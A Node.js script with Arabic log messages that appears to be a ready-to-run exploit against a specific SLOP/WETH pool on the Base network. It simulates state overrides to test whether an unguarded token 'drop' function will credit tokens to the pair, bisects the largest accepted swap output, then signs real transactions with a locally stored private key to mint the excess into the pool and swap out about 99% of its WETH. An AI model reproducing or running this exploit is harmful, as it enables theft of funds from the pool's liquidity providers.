import fs from "node:fs";
import { JsonRpcProvider, Wallet, keccak256, concat, zeroPadValue, toBeHex, formatUnits, formatEther } from "ethers";

const R   = process.env.RPC || "https://mainnet.base.org";
const T   = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P   = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W   = "0x4200000000000000000000000000000000000006";
const DRY = process.env.DRY === "1";

const j    = async (m, pr) => (await fetch(R, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad  = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32  = n => BigInt(n).toString(16).padStart(64, "0");
const hx   = n => "0x" + BigInt(n).toString(16).padStart(64, "0");
const slot = (a, s) => keccak256(concat([zeroPadValue(a, 32), toBeHex(s, 32)]));
const bn   = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };
const dec  = d => { if (!d || !d.startsWith("0x08c379a0")) return "(بلا نص)"; try { const n = parseInt(d.slice(66,130),16); return Buffer.from(d.slice(130,130+n*2),"hex").toString(); } catch { return "?"; } };

const mkSwap = (o, to) => "0x022c0d9f" + w32(o) + w32(0) + pad(to) + w32(0x80) + w32(0);
const mkDrop = (a, to) => "0x983bc41b" + w32(0x60) + pad(to) + w32(a) + w32(1) + pad(P);

let ME = null;

async function bisect(excess, o) {
  const rv = (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;
  const r0 = BigInt("0x" + rv.slice(2, 66)), r1 = BigInt("0x" + rv.slice(66, 130));
  let hi = r0 * excess / (r1 + excess);
  if (hi > r0 - 1n) hi = r0 - 1n;
  let lo = 1n, best = 0n;
  for (let i = 0; i < 48 && lo <= hi; i++) {
    const mid = (lo + hi) / 2n;
    const pr = [{ from: ME, to: P, data: mkSwap(mid, ME), gas: "0x30000" }, "latest"];
    if (o) pr.push(o);
    const r = await j("eth_call", pr);
    if (r.error) hi = mid - 1n; else { best = mid; lo = mid + 1n; }
  }
  return best;
}

async function main() {
  const p  = new JsonRpcProvider(R, 8453, { staticNetwork: true });
  const me = new Wallet(fs.readFileSync(process.env.HOME + "/.pk", "utf8").trim(), p);
  ME = me.address;

  const rv  = (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;
  const r0  = BigInt("0x" + rv.slice(2, 66)), r1 = BigInt("0x" + rv.slice(66, 130));
  const tk0 = "0x" + (await j("eth_call", [{ to: P, data: "0x0dfe1681" }, "latest"])).result.slice(-40).toLowerCase();
  if (tk0 !== W.toLowerCase()) throw new Error("WETH ليس token0");

  const balT = await bn(T, "0x70a08231" + pad(P));
  const eth  = await p.getBalance(ME);
  const base = BigInt((await j("eth_getBlockByNumber", ["latest", false])).result.baseFeePerGas);

  console.log("الاحتياطي:", formatEther(r0), "WETH |", formatUnits(r1, 9), "SLOP");
  console.log("رصيد الحوض:", formatUnits(balT, 9), "| ETH عندك:", formatEther(eth), "| BaseFee:", base.toString());

  const S = slot(P, 0);
  const ov = m => ({ [T]: { stateDiff: { [S]: hx(balT + m) } } });

  const chk = await j("eth_call", [{ to: T, data: "0x70a08231" + pad(P) }, "latest", ov(1n)]);
  console.log("تحقق خانة الرصيد (0):", !chk.error && BigInt(chk.result) === balT + 1n ? "✔" : "✘ " + (chk.error ? dec(chk.error.data) : chk.result));
  if (chk.error || BigInt(chk.result) !== balT + 1n) return;

  let M = 0n, maxX = 0n;
  for (const cand of [10n ** 22n, 10n ** 21n, 10n ** 20n, 10n ** 19n]) {
    const o = ov(cand);
    const d = await j("eth_call", [{ from: ME, to: T, data: mkDrop(cand, P), gas: "0x2a000" }, "latest", o]);
    if (d.error) { console.log("سك", formatUnits(cand, 9), "✗", dec(d.error.data)); continue; }
    const got = BigInt((await j("eth_call", [{ to: T, data: "0x70a08231" + pad(P) }, "latest", o])).result);
    if (got !== balT + cand) { console.log("سك", formatUnits(cand, 9), "✗ الوجهة ليست الحوض (زاد", formatUnits(got - balT, 9), ")"); continue; }
    const bx = await bisect(cand, o);
    console.log("سك", formatUnits(cand, 9), "✔ | أقصى مخرج:", formatEther(bx), "WETH");
    if (bx > maxX) { maxX = bx; M = cand; }
    if (bx > r0 * 96n / 100n) break;
  }
  if (!maxX) { console.log("لا قيمة تمر — الحارس أشد من الفائض"); return; }

  const out = maxX * 99n / 100n;
  console.log("الهدف:", formatEther(out), "WETH =", (out * 100n / r0).toString() + "% من الحوض");

  const gasDrop = 120000n;
  let gasSwap = 140000n;
  const est = await j("eth_estimateGas", [{ from: ME, to: P, data: mkSwap(out, ME) }, "latest", ov(M)]);
  if (!est.error) gasSwap = BigInt(est.result) * 12n / 10n;

  let mf = base * 2n;
  let need = (gasDrop + gasSwap) * mf;
  if (need > eth) { mf = base + 1000n; need = (gasDrop + gasSwap) * mf; }
  console.log("غاز مطلوب:", formatEther(need), "| متاح:", formatEther(eth), "| gasSwap:", gasSwap.toString());
  if (need > eth) { console.log("ناقص:", formatEther(need - eth), "ETH — أرسل هذا المبلغ وأعد التشغيل"); return; }
  if (DRY) { console.log("جاهز."); return; }

  const send = async (to, data, gas) => {
    for (let i = 0; i < 3; i++) {
      try {
        const rc = await (await me.sendTransaction({ to, data, gasLimit: gas, maxFeePerGas: mf, maxPriorityFeePerGas: 0n })).wait();
        if (rc.status === 1) return true;
      } catch (e) { console.log("  خطأ:", (e.shortMessage || e.message).slice(0, 80)); }
      if (i < 2) await new Promise(r => setTimeout(r, 7000));
    }
    return false;
  };

  console.log("1) سك الفائض إلى الحوض...");
  const before = await bn(T, "0x70a08231" + pad(P));
  if (!await send(T, mkDrop(M, P), gasDrop)) return;
  const got = (await bn(T, "0x70a08231" + pad(P))) - before;
  console.log("   زيادة فعلية:", formatUnits(got, 9), "SLOP");
  if (got <= 0n) return;

  console.log("2) قياس الحالة الحقيقية...");
  const mx2 = await bisect(got);
  if (!mx2) { console.log("لا قيمة تمر بعد السك"); return; }
  const out2 = mx2 * 99n / 100n;
  console.log("   أقصى مقبول:", formatEther(mx2), "→ أرسل", formatEther(out2));

  console.log("3) السحب...");
  if (!await send(P, mkSwap(out2, ME), gasSwap)) return;

  console.log("\n>>> WETH عندك:", formatEther(await bn(W, "0x70a08231" + pad(ME))));
  console.log(">>> ETH عندك:", formatEther(await p.getBalance(ME)));
}

main().catch(e => { console.error("فشل:", e.shortMessage || e.message); process.exit(1); });
